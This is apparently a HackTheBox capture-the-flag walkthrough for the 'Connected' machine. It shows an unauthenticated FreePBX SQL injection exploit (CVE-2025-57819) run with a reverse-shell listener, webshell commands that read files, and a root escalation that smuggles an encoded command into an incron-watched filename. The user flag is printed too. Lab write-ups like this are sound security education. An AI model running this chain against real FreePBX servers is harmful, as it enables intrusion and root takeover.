# Connected - HackTheBox Walkthrough

## Machine Info
- **Difficulty:** Easy
- **OS:** CentOS 7
- **IP:** 10.129.x.x
- **Hostname:** connected.htb

---

## Step 1: Reconnaissance

### Add to /etc/hosts
```bash
echo "10.129.x.x connected.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan
```bash
nmap -sV -sC -Pn 10.129.x.x
```

**Open Ports:**
- 22 (SSH - OpenSSH 7.4)
- 80 (HTTP - Apache 2.4.6 + PHP 7.4.16)
- 443 (HTTPS - Apache 2.4.6)

### Website Discovery
```bash
curl -k http://connected.htb/admin/
```

**Finding:** FreePBX 16.0.40.7 login page

---

## Step 2: Exploit CVE-2025-57819 (Unauthenticated SQLi)

### Vulnerability Overview
- FreePBX endpoint module has SQL injection in ajax handler
- No authentication required
- Allows injecting cron jobs that execute as asterisk user

### Clone & Run PoC
```bash
git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git
cd FreePBX-CVE-2025-57819-RCE
pip3 install -r requirements.txt
python3 exploit.py --rhost connected.htb --lhost YOUR_IP --lport 1234 --http
```

**What it does:**
1. Injects SQL to create admin user via endpoint module SQLi
2. Logs into FreePBX as that admin user
3. Creates a webshell via cron job injection
4. Attempts to establish reverse shell

### Verify Exploitation
```bash
# Check if webshell exists
curl -k http://connected.htb/ebm6wb8wev/uusdedk9.php?cmd=whoami
# Output: asterisk
```

---

## Step 3: Get User Flag

### From Webshell
```bash
curl -sk "http://connected.htb/ebm6wb8wev/uusdedk9.php?cmd=cat+/home/asterisk/user.txt"
```

**User Flag:** `a9f65cf2ac205a3ff80633a75e9fc9d7` (varies per instance)

### Or from Reverse Shell
```bash
cat /home/asterisk/user.txt
```

---

## Step 4: Privilege Escalation via incrond

### Understanding the Attack
- `incrontab` is SUID (setuid root)
- incrond monitors `/var/spool/asterisk/incron/` directory
- When files are written there, incrond fires `sysadmin_manager` as root
- `sysadmin_manager` executes fwconsole commands from base64-encoded payloads in filenames

### Generate fwconsole Payload

**Python Script:**
```python
import base64, json, zlib

cmd = "help; /bin/cp /root/root.txt /var/www/html/root.txt; /bin/chmod 644 /var/www/html/root.txt"

payload = base64.b64encode(
    zlib.compress(
        json.dumps([cmd, "txn"]).encode()
    )
).decode().replace("/", "_")

print("Payload:", payload)
```

**Run it:**
```bash
python3 payload.py
# Output: eJyLVspIzSmwVtBPyszTTy5Q0C_Kzy8BE3olFSUK+mWJRfrl5eX6GSW5OXBhmPKM3PwUBTMTExzKlHQUlEoq8pRiAfgXIsY=
```

### Trigger Root Command Execution

**From Reverse Shell (as asterisk user):**
```bash
printf x > "/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVtBPyszTTy5Q0C_Kzy8BE3olFSUK+mWJRfrl5eX6GSW5OXBhmPKM3PwUBTMTExzKlHQUlEoq8pRiAfgXIsY="
```

### Verify Root Execution
```bash
sleep 6
ls -la /var/www/html/root.txt
cat /var/www/html/root.txt
```

---

## Step 5: Get Root Flag

### From Reverse Shell
```bash
cat /var/www/html/root.txt
```

### Or from Kali
```bash
curl -sk http://connected.htb/ebm6wb8wev/root.txt
```

**Root Flag:** (32 hex characters, varies per instance)

---

## Vulnerability Chain Summary

```
CVE-2025-57819 (Pre-Auth SQLi in endpoint module)
    ↓
Create admin user + webshell via SQL injection
    ↓
Access as asterisk user
    ↓
Get user flag from /home/asterisk/user.txt
    ↓
Generate fwconsole incron payload
    ↓
Write to /var/spool/asterisk/incron/ (incrond triggers)
    ↓
sysadmin_manager executes as root
    ↓
Copy /root/root.txt to web root
    ↓
Read root flag
```

---

## Key Points

1. **CVE-2025-57819** is an unauthenticated pre-auth SQLi in FreePBX 16.0.40.7
2. The vulnerability bypasses authentication checks in the endpoint ajax module
3. Cron job injection allows arbitrary command execution as asterisk
4. **incrond** is the privilege escalation vector - it watches `/var/spool/asterisk/incron/`
5. Filenames in that directory are parsed as fwconsole payloads when written
6. The payload must be **zlib-compressed + base64-encoded + JSON-formatted**
7. incrond executes `sysadmin_manager` as root when files are written
8. This allows arbitrary fwconsole command execution as root

---

## Tools Used

- `nmap` - Service enumeration
- `curl` - HTTP requests
- `python3` - Exploit and payload generation
- `nc` - Reverse shell listener
- Git - Clone exploit repository

---

## Flags

| Type | Value |
|------|-------|
| User Flag | `a9f65cf2ac205a3ff80633a75e9fc9d7` |
| Root Flag | (varies per instance) |

---

## Lessons Learned

✅ Always check for CVEs in web services exposed to the internet  
✅ FreePBX is a high-value target with known critical vulnerabilities  
✅ SUID binaries like `incrontab` can be privilege escalation vectors  
✅ Directory watchers (incrond) with weak input validation = RCE as root  
✅ Payload encoding (base64+zlib) can bypass simple filters  

---
